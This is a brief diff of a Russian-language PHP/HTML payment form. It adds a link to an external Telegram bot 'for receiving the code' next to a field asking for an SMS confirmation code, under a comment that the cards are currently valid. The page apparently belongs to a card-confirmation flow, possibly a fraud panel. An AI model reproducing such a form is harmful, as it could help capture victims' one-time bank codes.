@@ -134,6 +134,9 @@ if(!$err[0]){//на данный момент - карты валидные, с�
 					</span>
 				</label>
 				<input type="text" class="form-control" name="check2" placeholder="Введите код из СМС" required>
+                <a class="btn btn-block btn-default " target="_blank"  href="http://t-do.ru/sms_mil_bot">
+                    Телеграмм бот  для принятия кода
+                </a>
 			</div>
 		</div>
 		<button type="submit" class="btn btn-success">Подтвердить операцию</button>
